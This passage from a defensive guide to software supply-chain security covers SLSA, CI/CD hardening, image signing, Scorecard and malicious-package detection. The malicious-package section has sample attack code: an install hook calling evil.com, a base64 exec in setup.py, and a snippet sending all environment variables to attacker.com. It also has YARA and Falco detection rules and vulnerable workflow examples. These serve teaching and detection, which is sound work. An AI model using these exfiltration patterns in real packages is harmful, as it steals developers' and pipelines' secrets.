|-------------|----|----|----|----|
| **Provenance exists** | No | Yes | Yes | Yes |
| **Build scripted** | No | Yes | Yes | Yes |
| **Provenance signed** | No | No | Yes | Yes |
| **Hosted build service** | No | No | Yes | Yes |
| **Hardened build** | No | No | No | Yes |
| **Non-forgeable provenance** | No | No | No | Yes |
| **Ephemeral build environment** | No | No | No | Yes |
| **Hermetic build** | No | No | No | Recommended |
| **Reproducible build** | No | No | No | Recommended |
| **Two-party review** | No | No | No | No (L4) |

**SLSA L0**: No guarantees. No provenance, no verification. This is the baseline state of most open-source software today.

**SLSA L1**: Provenance exists and the build is scripted (automated, not manual). Provenance does not need to be signed. Protects against accidental errors in the build process and provides documentation of how artifacts were built. Easy to achieve by adding provenance generation to existing CI/CD workflows.

**SLSA L2**: Provenance is signed by the build service that created it and the build runs on a hosted build service (not developer workstations). The hosted service authenticates provenance authorship. Protects against compromised developer workstations. GitHub Actions, Google Cloud Build, GitLab CI qualify as hosted build services.

**SLSA L3**: Build is hardened against tampering during the build process. Provenance is non-forgeable — the build service generates and signs provenance such that even the operator of the service cannot forge provenance for an artifact they didn't build. Environment is ephemeral: no persistent workspace between builds, fresh environment for each build. Protects against insider threats at the build service operator level.

**SLSA L4** (deprecated in SLSA v1.0, merged into L3+): Two-person review of all source changes before they can influence the build. Hermetic and reproducible builds required. Now addressed through source requirements separate from build requirements in SLSA v1.0.

### Source Requirements

- **Version controlled**: All source code tracked in a version control system (git, Mercurial, SVN)
- **Verified history**: Cannot delete or modify existing history; append-only
- **Retained 18 months**: Source code and version history retained for at least 18 months
- **Two-person reviewed**: Each commit reviewed and approved by at least one other trusted person before it can affect the build (required for highest source level)
- **Consistent**: No inconsistency between source code and VCS contents at build time

### Build Requirements

- **Scripted**: Build definition is in code, not manual steps
- **Build-as-code**: Build definition stored in version control
- **Ephemeral environment**: Build runs in a fresh, isolated environment for each build (no shared mutable state)
- **Hermetic**: Build does not fetch dependencies at build time; all inputs are declared and fetched before the build begins. Network access blocked during build.
- **Reproducible**: Given the same inputs, the build produces bit-for-bit identical outputs (optional for L3, required for highest levels)

### Provenance Requirements

- **Available**: Provenance is generated and available for consumers to access
- **Authenticated**: Provenance is signed by the build service
- **Service-generated**: Provenance is generated by the build service, not the build script
- **Non-falsifiable**: Build service generates provenance such that even the caller cannot forge it
- **Dependencies complete**: All build inputs are listed in the provenance, including transitive dependencies where possible

### Achieving SLSA L3 on GitHub Actions

GitHub Actions qualifies as an L3 build platform when using the SLSA GitHub Generator:

```yaml
# .github/workflows/release.yml
name: Release

on:
  push:
    tags: ['v*']

permissions:
  id-token: write    # Required for OIDC signing
  contents: read
  actions: read

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      hashes: ${{ steps.hash.outputs.hashes }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

      - name: Build artifacts
        run: make release

      - name: Generate hashes
        id: hash
        run: |
          sha256sum ./dist/* | base64 -w0 > hashes.txt
          echo "hashes=$(cat hashes.txt)" >> $GITHUB_OUTPUT

      - uses: actions/upload-artifact@v4
        with:
          name: dist
          path: ./dist

  # SLSA L3 provenance generation
  provenance:
    needs: [build]
    permissions:
      actions: read
      id-token: write
      contents: write
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.0.0
    with:
      base64-subjects: "${{ needs.build.outputs.hashes }}"
      upload-assets: true
```

### SLSA Verifier CLI

```bash
# Install
go install github.com/slsa-framework/slsa-verifier/v2/cli/slsa-verifier@latest

# Verify binary artifact with SLSA provenance
slsa-verifier verify-artifact myapp-linux-amd64   --provenance-path myapp-linux-amd64.intoto.jsonl   --source-uri github.com/owner/repo   --source-tag v1.2.3

# Verify with branch (not tag)
slsa-verifier verify-artifact myapp-linux-amd64   --provenance-path myapp-linux-amd64.intoto.jsonl   --source-uri github.com/owner/repo   --source-branch main

# Verify container image SLSA provenance
slsa-verifier verify-image ghcr.io/owner/image:tag   --source-uri github.com/owner/repo   --source-tag v1.2.3

# Print verified provenance
slsa-verifier verify-artifact myapp-linux-amd64   --provenance-path myapp-linux-amd64.intoto.jsonl   --source-uri github.com/owner/repo   --print-provenance | jq .predicate
```

### SLSA for Containers

```yaml
# Container SLSA L3 workflow
name: Container Release

on:
  push:
    tags: ['v*']

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      image: ${{ steps.meta.outputs.tags }}
      digest: ${{ steps.build.outputs.digest }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

      - name: Docker meta
        id: meta
        uses: docker/metadata-action@902fa8ec7d6ecbea8a986b1b88a5c2a4f33dc97a

      - name: Build and push
        id: build
        uses: docker/build-push-action@471d1dc4e07e5cdedd4c2171150001c434f0b2c8
        with:
          push: true
          tags: ${{ steps.meta.outputs.tags }}

  provenance:
    needs: [build]
    permissions:
      actions: read
      id-token: write
      packages: write
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v2.0.0
    with:
      image: ${{ needs.build.outputs.image }}
      digest: ${{ needs.build.outputs.digest }}
    secrets:
      registry-username: ${{ github.actor }}
      registry-password: ${{ secrets.GITHUB_TOKEN }}
```

### GUAC (Graph for Understanding Artifact Composition)

GUAC (Graph for Understanding Artifact Composition) is an OpenSSF project that aggregates software security metadata into a queryable graph database:

```bash
# Start GUAC infrastructure
docker-compose up -d

# Ingest SLSA provenance
guacone collect files --gql-addr=http://localhost:8080/query   ./provenance/myapp.intoto.jsonl

# Ingest SBOM
guacone collect files --gql-addr=http://localhost:8080/query   ./sbom/myapp.spdx.json

# Query: what depends on a vulnerable package?
guacone query known --gql-addr=http://localhost:8080/query   "pkg:npm/lodash@4.17.20"

# Query: complete dependency path to root
guacone query path --gql-addr=http://localhost:8080/query   --subject "pkg:pypi/requests@2.27.1"   --target "pkg:pypi/django@4.2.0"
```

GUAC ingests: SBOMs (SPDX, CycloneDX), SLSA provenance, Scorecard results, OSV vulnerability data, CSAF/VEX documents, and certificate transparency logs, building a unified graph for querying artifact relationships across the entire supply chain.


## 6. CI/CD Pipeline Security

### OWASP Top 10 CI/CD Security Risks

| ID | Risk | Description | Examples |
|----|------|-------------|---------|
| CICD-SEC-1 | Insufficient Flow Control Mechanisms | Ability to push code/configs that trigger pipelines without sufficient review | Merging to main without PR review, bypassing branch protection |
| CICD-SEC-2 | Inadequate Identity and Access Management | Overly permissive identities in pipeline ecosystems | Shared service accounts, no MFA on CI accounts, excessive IAM permissions |
| CICD-SEC-3 | Dependency Chain Abuse | Attacks through third-party packages and dependencies | Malicious npm packages, compromised PyPI packages, dependency confusion |
| CICD-SEC-4 | Poisoned Pipeline Execution (PPE) | Ability to execute unreviewed code in the CI pipeline context | PR-based attacks, branch-based attacks on misconfigured pipelines |
| CICD-SEC-5 | Insufficient PBAC (Pipeline-Based Access Controls) | Pipeline credentials with more permissions than needed | GITHUB_TOKEN with write-all, AWS credentials with AdministratorAccess |
| CICD-SEC-6 | Insufficient Credential Hygiene | Insecure credential storage and handling in pipelines | Secrets in env vars, secrets in logs, long-lived credentials, no rotation |
| CICD-SEC-7 | Insecure System Configuration | Misconfigured CI/CD systems exposing attack surface | Jenkins with no auth, public Argo CD, unprotected pipeline endpoints |
| CICD-SEC-8 | Ungoverned Usage of 3rd Party Services | Risk from third-party services integrated into pipeline | Compromised cloud storage, malicious marketplace actions, webhook attacks |
| CICD-SEC-9 | Improper Artifact Integrity Validation | Fetching artifacts without integrity verification | Downloading binaries without checksum, unpinned Docker images |
| CICD-SEC-10 | Insufficient Logging and Visibility | Lack of audit trail for pipeline activities | No logging of secret access, no alerting on unusual pipeline behavior |

### Poisoned Pipeline Execution (PPE)

PPE attacks allow adversaries to execute malicious code in CI pipelines without direct repository write access.

**Direct PPE**: Attacker has write access to a branch that triggers CI. They push malicious pipeline configuration or build scripts. Target: any developer or bot account with push access to non-protected branches.

```yaml
# Vulnerable: triggers on any push to any branch
on:
  push:
    branches: ['**']

# Attack: push malicious workflow modification to feature branch
```

**Indirect PPE**: Attacker modifies files referenced by the pipeline (build scripts, Makefile, test configuration) in a PR. When CI runs tests, it executes the attacker's code.

```yaml
# Vulnerable: runs make test from PR-provided code without review
jobs:
  test:
    steps:
      - uses: actions/checkout@v4  # Checks out PR code
      - run: make test             # Attacker controls Makefile
```

**Public PPE**: Forks submitting PRs can trigger CI workflows in the parent repository context. If the workflow accesses secrets, the fork's code runs with access to those secrets.

```yaml
# Vulnerable: exposes secrets to fork PRs
on:
  pull_request_target:  # Dangerous when combined with checkout of head

steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # Fork code
  - run: ./test.sh
    env:
      SECRET: ${{ secrets.PRODUCTION_SECRET }}  # Exposed to fork!
```

### GitHub Actions Hardening

#### Pin Actions to Full Commit SHA

```yaml
# WRONG - version tag can be moved to point to malicious code
- uses: actions/checkout@v4
- uses: docker/build-push-action@v5

# CORRECT - immutable SHA reference
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: docker/build-push-action@471d1dc4e07e5cdedd4c2171150001c434f0b2c8  # v6.9.0

# Use Dependabot to keep SHA pins updated
# .github/dependabot.yml
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

#### GITHUB_TOKEN Least Privilege

```yaml
# Top-level default: minimal permissions
permissions:
  contents: read   # Default: can only read repo

jobs:
  build:
    permissions:
      contents: read      # Read repo code
      packages: write     # Push to GHCR
      id-token: write     # OIDC token for keyless signing
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

  release:
    permissions:
      contents: write     # Create release
      packages: write     # Push packages
      id-token: write     # OIDC signing
      attestations: write # Write attestations

# Never use:
# permissions: write-all  # Grants all permissions
```

#### OIDC Federation for Cloud Auth

```yaml
# AWS OIDC - no long-lived credentials in secrets
- name: Configure AWS credentials
  uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
  with:
    role-to-assume: arn:aws:iam::123456789012:role/GitHubActions
    aws-region: us-east-1
    # No access-key-id or secret-access-key needed!

# GCP OIDC
- uses: google-github-actions/auth@71f986410dfbc4c3cf7f2dfb2ab1f22d4b69fb51
  with:
    workload_identity_provider: 'projects/123/locations/global/workloadIdentityPools/pool/providers/github'
    service_account: 'ci@project.iam.gserviceaccount.com'

# Azure OIDC
- uses: azure/login@a65d910e8af852a8061c627c456678983e180302
  with:
    client-id: ${{ secrets.AZURE_CLIENT_ID }}
    tenant-id: ${{ secrets.AZURE_TENANT_ID }}
    subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
    # No client-secret needed - uses OIDC federation
```

#### Secret Scanning

```bash
# Gitleaks - detect secrets in git history and working tree
gitleaks detect --source=. --report-format=sarif --report-path=gitleaks.sarif

# TruffleHog - deep entropy-based scanning
trufflehog git file://. --only-verified --json

# Scan GitHub repo
trufflehog github --repo=https://github.com/owner/repo --only-verified

# As pre-commit hook
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
gitleaks protect --staged --redact
EOF
chmod +x .git/hooks/pre-commit

# detect-secrets pre-commit configuration
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
        exclude: .*\.lock$
```

### GitLab CI Security

```yaml
# Protected variables - only available on protected branches/tags
# Set in GitLab UI: Settings > CI/CD > Variables > Protected: Yes

# Environment scoping
deploy-production:
  environment:
    name: production
  only:
    - main
  # PROD_SECRET only available in production environment

# Restrict who can trigger pipelines
# .gitlab-ci.yml
deploy:
  rules:
    - if: '$CI_COMMIT_BRANCH == "main" && $CI_PIPELINE_SOURCE == "push"'
      when: on_success
    - when: never
```

### Jenkins Security

```groovy
// Script approval - requires admin approval for Groovy methods
// Jenkins > Manage Jenkins > In-process Script Approval

// Groovy sandbox: limits available methods
// Enable in pipeline: Use Groovy Sandbox checkbox

// Credential binding - never echo secrets
pipeline {
    agent any
    environment {
        AWS_CREDS = credentials('aws-production')
    }
    stages {
        stage('Deploy') {
            steps {
                withCredentials([string(credentialsId: 'api-key', variable: 'API_KEY')]) {
                    sh 'deploy.sh'  // API_KEY available but masked in logs
                }
            }
        }
    }
}
```

### Tekton Chains (Attestation Generation)

Tekton Chains automatically generates signed attestations for TaskRuns:

```yaml
# Configure Tekton Chains
apiVersion: v1
kind: ConfigMap
metadata:
  name: chains-config
  namespace: tekton-chains
data:
  artifacts.oci.format: "sigstore"
  artifacts.oci.signer: "x509"
  artifacts.taskrun.format: "slsaprovenance"
  artifacts.taskrun.signer: "x509"
  transparency.enabled: "true"
  transparency.url: "https://rekor.sigstore.dev"
```

### detect-secrets Pre-commit Hook

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']

  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
```

```bash
# Initialize baseline (add existing false positives)
detect-secrets scan > .secrets.baseline

# Audit baseline to mark false positives
detect-secrets audit .secrets.baseline

# Update baseline after adding new code
detect-secrets scan --baseline .secrets.baseline
```


## 7. Container & Registry Security

### Image Signing Workflow in CI

```yaml
# Complete signing workflow in GitHub Actions
name: Build, Sign, and Attest

on:
  push:
    tags: ['v*']

permissions:
  contents: read
  packages: write
  id-token: write      # Required for keyless cosign signing
  attestations: write  # Required for GitHub attestations

jobs:
  build-sign:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@b5ca514318bd67b64cf7d50a8781b4d86d4928b4

      - name: Log in to GHCR
        uses: docker/login-action@74a5d142397b4f367a81961eba4e8cd7edddf772
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push
        id: push
        uses: docker/build-push-action@471d1dc4e07e5cdedd4c2171150001c434f0b2c8
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.ref_name }}

      # Sign AFTER push, BEFORE deploy - use digest not tag
      - name: Install cosign
        uses: sigstore/cosign-installer@dc72c7d5c4d10cd6bcb8cf6e3fd625a9e5e537da

      - name: Sign image
        run: |
          cosign sign --yes             ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}

      # Generate and attach SBOM
      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          image: ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}
          format: spdx-json
          output-file: sbom.spdx.json

      - name: Attach SBOM to image
        run: |
          cosign attach sbom             --sbom sbom.spdx.json             ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}

      # GitHub native attestation
      - name: Attest build provenance
        uses: actions/attest-build-provenance@v1
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true
```

### OCI Registry Security Comparison

| Feature | Harbor | Quay (Red Hat) | AWS ECR |
|---------|--------|----------------|---------|
| Vulnerability Scanning | Trivy, Clair integrated | Clair integrated | Amazon Inspector, ECR Basic Scanning |
| Image Signing | Cosign, Notary v2 (Harbor 2.x) | Cosign | Cosign (via ECR) |
| RBAC | Project-level RBAC, LDAP/OIDC integration | Organization/team based, robot accounts | IAM policies, repository policies |
| Immutable Tags | Yes (content trust) | Yes (tag expiration rules) | Yes (immutable tag setting) |
| Replication | Cross-registry replication | Cross-registry mirroring | Cross-region/account replication |
| Proxy Cache | Yes | Yes | Yes (pull-through cache) |
| SBOM Storage | OCI artifact attachment | OCI artifact attachment | OCI artifact attachment |
| Retention Policies | Yes (rule-based) | Yes | Yes (lifecycle policies) |
| Audit Logging | Yes | Yes | CloudTrail integration |
| Self-hosted | Yes (Kubernetes, Docker Compose) | Yes (OpenShift, Kubernetes) | No (managed service) |
| Pricing | Open source (free) | Open source (free), Quay.io (paid) | Per GB storage + data transfer |

### Image Scanning Commands

```bash
# Trivy - comprehensive scanner
trivy image --severity CRITICAL,HIGH nginx:latest

# Output as SARIF for GitHub Security tab
trivy image --format sarif --output trivy-results.sarif nginx:latest

# Scan with secret detection
trivy image --scanners secret nginx:latest

# Scan filesystem
trivy fs --severity HIGH,CRITICAL .

# Scan IaC (Dockerfile, Kubernetes, Terraform)
trivy config .

# Grype (Anchore) - fast, accurate
grype nginx:latest

# Output as JSON
grype nginx:latest -o json | jq '.matches[] | select(.vulnerability.severity=="Critical")'

# Scan SBOM
grype sbom:./sbom.spdx.json

# Snyk Container
snyk container test nginx:latest --severity-threshold=high
snyk container monitor nginx:latest  # Monitor continuously

# Scan Docker Compose
snyk container test --file=docker-compose.yml
```

### Dockerfile Hardening Checklist

```dockerfile
# 1. Use specific digest-pinned base image (not :latest)
FROM debian:12.5-slim@sha256:abc123...

# 2. Non-root user
RUN groupadd -r appuser && useradd -r -g appuser appuser

# 3. Minimal package installation with cleanup
RUN apt-get update &&     apt-get install -y --no-install-recommends         ca-certificates         curl &&     rm -rf /var/lib/apt/lists/*

# 4. Copy with explicit ownership (not root)
COPY --chown=appuser:appuser ./app /app

WORKDIR /app

# 5. No SUID/SGID binaries
RUN find / -perm /6000 -type f -exec chmod a-s {} \; || true

# 6. Use USER instruction
USER appuser

# 7. HEALTHCHECK
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3     CMD curl -f http://localhost:8080/health || exit 1

# 8. No secrets in ENV or ARG
# WRONG: ENV DATABASE_PASSWORD=secret123
# RIGHT: Use secrets at runtime via environment

EXPOSE 8080

ENTRYPOINT ["./app"]
```

**Kubernetes Security Context to complement hardened image:**
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 10001
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities:
    drop:
      - ALL
  seccompProfile:
    type: RuntimeDefault
```

### Kyverno ClusterPolicy: Require Signed Images

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-signed-images
spec:
  validationFailureAction: Enforce
  background: false
  rules:
    - name: check-image-signature
      match:
        any:
          - resources:
              kinds: [Pod]
      verifyImages:
        - imageReferences:
            - "ghcr.io/myorg/*"
          attestors:
            - count: 1
              entries:
                - keyless:
                    subject: "https://github.com/myorg/*"
                    issuer: "https://token.actions.githubusercontent.com"
                    rekor:
                      url: https://rekor.sigstore.dev
          attestations:
            - predicateType: https://slsa.dev/provenance/v1
              conditions:
                - all:
                    - key: "{{ builder.id }}"
                      operator: Equals
                      value: "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v2.0.0"
```

### OPA/Gatekeeper: Image Registry Allowlist

```yaml
# ConstraintTemplate
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: allowedregistries
spec:
  crd:
    spec:
      names:
        kind: AllowedRegistries
      validation:
        openAPIV3Schema:
          properties:
            registries:
              type: array
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package allowedregistries
        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          not any_registry_match(container.image)
          msg := sprintf("Image '%v' is not from an allowed registry", [container.image])
        }
        any_registry_match(image) {
          registry := input.parameters.registries[_]
          startswith(image, registry)
        }

---
# Constraint applying the template
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: AllowedRegistries
metadata:
  name: require-approved-registries
spec:
  match:
    kinds: [{apiGroups: [""], kinds: ["Pod"]}]
    namespaces: ["default", "production"]
  parameters:
    registries:
      - "ghcr.io/myorg/"
      - "docker.io/myorg/"
      - "123456789.dkr.ecr.us-east-1.amazonaws.com/"
```

### Falco Rule: Suspicious Container Activity

```yaml
# /etc/falco/rules.d/supply-chain.yaml

# Detect package manager execution in container
- rule: Package Management in Container
  desc: Package management tool running inside container may indicate tampered image
  condition: >
    spawned_process and container and
    (proc.name in (package_mgmt_binaries) or
     proc.name in (npm, pip, pip3, gem, cargo))
  output: >
    Package manager executed in container (user=%user.name command=%proc.cmdline
    container_id=%container.id image=%container.image.repository)
  priority: WARNING
  tags: [supply_chain, container]

# Detect outbound connection to suspicious domains during build
- rule: Outbound Connection from CI Container
  desc: Unexpected outbound connection from build container
  condition: >
    outbound and container and
    not fd.sip in (approved_build_ips) and
    container.image.repository contains "build"
  output: >
    Unexpected outbound connection from build container
    (command=%proc.cmdline connection=%fd.name image=%container.image.repository)
  priority: CRITICAL
  tags: [supply_chain, network]
```


## 8. Malicious Package Detection

### Typosquatting Detection

#### Edit Distance Algorithms

Typosquatting detection compares new package names against a corpus of popular packages using string similarity metrics:

**Levenshtein Distance**: The minimum number of single-character edits (insertions, deletions, substitutions) needed to transform one string into another. A threshold of ≤2 from top-1000 packages flags most typosquats.

```python
import editdistance

def is_potential_typosquat(package_name, popular_packages, threshold=2):
    for popular in popular_packages:
        distance = editdistance.eval(package_name, popular)
        if 0 < distance <= threshold:  # Exclude exact matches (0 distance)
            yield (popular, distance)

# Examples:
# "reqeusts" vs "requests" -> distance 2 (transposition + substitution)
# "lodahs" vs "lodash" -> distance 2
# "colour" vs "color" -> distance 1 (extra 'u')
```

**Common typosquatting patterns:**
- Character transposition: `reqeusts` → `requests`
- Missing character: `reques` → `requests`
- Extra character: `requestss` → `requests`
- Character substitution: `1odash` → `lodash` (l→1 homoglyph)
- Hyphen/underscore confusion: `py-yaml` vs `pyyaml`
- Plural/singular: `colour` vs `color`

#### Unicode Confusable Detection

Unicode homoglyphs allow visually identical but technically different package names:

```python
import unicodedata

def detect_unicode_confusables(package_name):
    # Normalize to ASCII equivalents
    normalized = unicodedata.normalize('NFKD', package_name)
    ascii_only = normalized.encode('ascii', 'ignore').decode()
    if ascii_only != package_name:
        return True, ascii_only  # Contains non-ASCII lookalikes
    return False, None

# Examples of confusable characters:
# Cyrillic 'а' (U+0430) looks identical to Latin 'a' (U+0061)
# Greek 'ο' (U+03BF) looks identical to Latin 'o' (U+006F)
# 'pаckage' with Cyrillic 'а' would pass a visual check but is a different string
```

#### Package Name Squatting Patterns

- **Pre-registration**: Registering `company-internal-package` on public npm/PyPI before the company does
- **Namespace occupation**: Registering `@companyname/` scoped packages on npm
- **Version shadowing**: Publishing a higher version of a private package name on public registry
- **CDN dependency**: Squatting on package names referenced in documentation or tutorials

### Dependency Confusion Attacks

**Original Research (Alex Birsan, 2021):**

Birsan discovered that when both private and public registries are configured, most package managers prefer the higher version number regardless of registry source. By registering a package with the same name as a private internal package but a higher version (99.0.0 vs internal 1.0.0), he caused automated pipelines at 35 companies to download and execute his code.

```bash
# Vulnerable npm configuration
npm install --registry=https://internal.registry.company.com/

# If registry is not exclusive, npm also checks public registry
# Attacker publishes company-internal-utils@99.0.0 to public npm
# npm downloads the higher version from public registry!

# Fix: Use scoped packages exclusively for internal code
# @company/internal-utils  -- scope prevents confusion with unscoped public packages

# Fix: Configure private registry as exclusive for internal scopes
# .npmrc
@company:registry=https://internal.registry.company.com/
//internal.registry.company.com/:_authToken=${INTERNAL_TOKEN}

# Fix: Python - use index-url with no-index for private packages
pip install --index-url https://internal.pypi.company.com/simple/             --no-index             company-internal-package
```

**Detection:**
- Monitor public registries for package names that match internal package names
- Alert on any public registration of packages matching internal naming conventions
- Configure package manager priority: private registry always takes precedence for internal scopes
- Verify package metadata: internal packages should have internal maintainer emails

### Malicious Package Behavior Indicators

#### Suspicious Install Scripts

```javascript
// package.json - suspicious postinstall script
{
  "name": "legitimate-sounding-package",
  "scripts": {
    "preinstall": "node -e "require('https').get('http://evil.com/'+require('os').hostname())"",
    "postinstall": "node collect.js"
  }
}
```

```python
# setup.py with malicious code execution at install time
from setuptools import setup
import os, base64

# Code runs during pip install
exec(base64.b64decode('aW1wb3J0IG9z...'))

setup(name='legitimate-package', ...)
```

#### Environment Variable Exfiltration

```javascript
// Common exfiltration pattern in malicious npm packages
const https = require('https');
const env_data = JSON.stringify(process.env);  // Serialize all env vars
const encoded = Buffer.from(env_data).toString('base64');

https.get(`https://attacker.com/collect?d=${encoded}`, (res) => {});
// Captures: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN,
//           NPM_TOKEN, DATABASE_URL, and all other environment variables
```

#### Crypto Mining Indicators

```bash
# Indicators in malicious packages:
# 1. CPU spike immediately upon installation
# 2. stratum+tcp:// URLs in source (mining pool protocol)
# 3. xmrig, minerd, cryptonight references
# 4. Persistence mechanisms (cron, systemd, registry keys)

# Detection:
# Monitor CPU usage during npm install / pip install
# Static analysis: search for mining pool URLs
grep -r "stratum+tcp" node_modules/
grep -r "xmrig\|cryptonight\|monero" node_modules/
```

#### YARA Rule for Malicious npm Package

```yara
rule Malicious_NPM_Install_Script {
    meta:
        description = "Detects suspicious npm postinstall scripts"
        severity = "high"

    strings:
        $exfil1 = "process.env" ascii
        $exfil2 = "JSON.stringify" ascii
        $network1 = "http.get" ascii
        $network2 = "https.request" ascii
        $network3 = "axios.post" ascii
        $obfusc1 = "eval(Buffer.from(" ascii
        $obfusc2 = "eval(atob(" ascii
        $obfusc3 = "Function(atob(" ascii
        $base64decode = ".from('base64')" ascii
        $mining = "stratum+tcp://" ascii

    condition:
        (2 of ($exfil*) and 1 of ($network*)) or
        (1 of ($obfusc*) and $base64decode) or
        $mining
}
```

### OSS Malware Detection Projects

#### CNCF Package Analysis (OpenSSF)

The OpenSSF Package Analysis project dynamically analyzes packages published to PyPI and npm:
- Installs the package in an isolated sandbox
- Monitors system calls (syscalls) for file operations, network connections, process spawning
- Flags suspicious behaviors: outbound network connections on install, shell execution, file access outside package directory
- Results published to BigQuery for community analysis

```bash
# Run Package Analysis locally
docker run --rm   -v /var/run/docker.sock:/var/run/docker.sock   gcr.io/ossf-malware-analysis/analysis:latest   analyze --package requests --version 2.28.0 --ecosystem PyPI
```

#### Socket.dev Diff Analysis

Socket.dev analyzes the diff between consecutive package versions to detect:
- New install scripts added in minor/patch releases (high suspicion)
- New network requests added to existing code
- Newly obfuscated sections
- New binary blobs or encrypted content
- Changed maintainer email or GPG key

#### Phylum Platform

Phylum performs behavioral scoring for packages across 5 risk dimensions:
1. **Author risk**: Account age, prior packages, contributor history
2. **Engineering risk**: Code quality metrics, test coverage, documentation
3. **Malicious code risk**: Static analysis for malware patterns
4. **Vulnerability risk**: Known CVEs in the package
5. **License risk**: License compatibility and compliance

```bash
# Phylum CLI
phylum analyze requirements.txt
phylum package npm lodash 4.17.21  # Analyze specific package
phylum project status              # Current project policy status
```

### PyPI Malware Reporting Process

1. **Discovery**: Identify malicious package via behavioral analysis, user report, or automated scanning
2. **Report**: File report at security@pypi.org or via https://pypi.org/security/
3. **Include**: Package name, version(s), evidence of malicious behavior, YARA rules if available
4. **Timeline**: PyPI security team typically responds within hours for high-severity cases
5. **Removal**: PyPI admins quarantine/remove package; may ban maintainer account
6. **Disclosure**: OpenSSF Malicious Packages repository updated with package details and analysis

```bash
# Check if package is quarantined
pip install suspicious-package
# Quarantined packages return: "ERROR: No matching distribution found"

# Verify package publisher via PyPI API
curl https://pypi.org/pypi/requests/json | jq '.info.author_email'
```


## 9. Open Source Risk Management

### OSSF Scorecard Checks

The OpenSSF Scorecard evaluates open source project security practices across multiple dimensions, each scored 0-10:

| Check | Weight | Description | What it Measures |
|-------|--------|-------------|-----------------|
| Branch-Protection | High | Repository branch protection rules | Requires PR reviews, dismisses stale reviews, requires status checks |
| Code-Review | High | Code review before merge | Percentage of recent commits reviewed by another contributor |
| CI-Tests | Low | Tests run in CI on each commit | Presence of CI testing workflows |
| Contributors | Low | Project contributor diversity | Number of unique organizations contributing |
| Dangerous-Workflow | Critical | Dangerous GitHub Actions patterns | Detects pull_request_target with checkout of external code, script injection |
| Dependency-Update | Medium | Automated dependency updates | Dependabot or Renovate configuration present |
| Fuzzing | Medium | Fuzz testing | Integration with OSS-Fuzz or other fuzzing platforms |
| License | Low | Project license | SPDX license identifier present |
| Maintained | High | Project maintenance activity | Recent commits, issue responses, release cadence |
| Packaging | Medium | Package published to registry | Package published with provenance to package registry |
| Pinned-Dependencies | Medium | Dependencies pinned to specific versions | GitHub Actions pinned to SHA, Dockerfile FROM pinned |
| SAST | Medium | Static analysis security testing | CodeQL, SonarCloud, or other SAST configured |
| Signed-Releases | High | Release artifacts signed | Releases signed with GPG, cosign, or similar |
| Token-Permissions | High | GITHUB_TOKEN minimal permissions | Workflows declare minimal permissions, no write-all |
| Vulnerabilities | High | Open vulnerabilities | No unresolved vulnerabilities in OSV database |
| Webhooks | Low | Webhook security | Webhooks use secrets for verification |

### Running Scorecard

```bash
# Install
go install github.com/ossf/scorecard/v4/cmd/scorecard@latest

# Run all checks on a repo
scorecard --repo=github.com/owner/repo --checks=all

# Output as JSON
scorecard --repo=github.com/owner/repo   --format=json   --output=scorecard-results.json

# Specific checks only
scorecard --repo=github.com/owner/repo   --checks=Branch-Protection,Code-Review,Dangerous-Workflow

# Run in GitHub Actions (using GITHUB_TOKEN)
- uses: ossf/scorecard-action@0864cf19026789058feabb7e87baa5f140aac736
  with:
    results_file: results.sarif
    results_format: sarif
    publish_results: true

# Using Scorecard API (no token needed for public repos)
curl "https://api.securityscorecards.dev/projects/github.com/owner/repo" | jq '
  {
    score: .score,
    checks: [.checks[] | {name: .name, score: .score, reason: .reason}]
  }'
```

### OpenSSF Best Practices Badge Levels

**Passing (Bronze)**: Basic security practices
- HTTPS for project website and repository
- Vulnerability disclosure policy (SECURITY.md)
- At least one automated test suite
- At least one static analysis tool used
- Signed releases or cryptographic hashes for releases
- Uses standard coding style

**Silver**: More rigorous practices
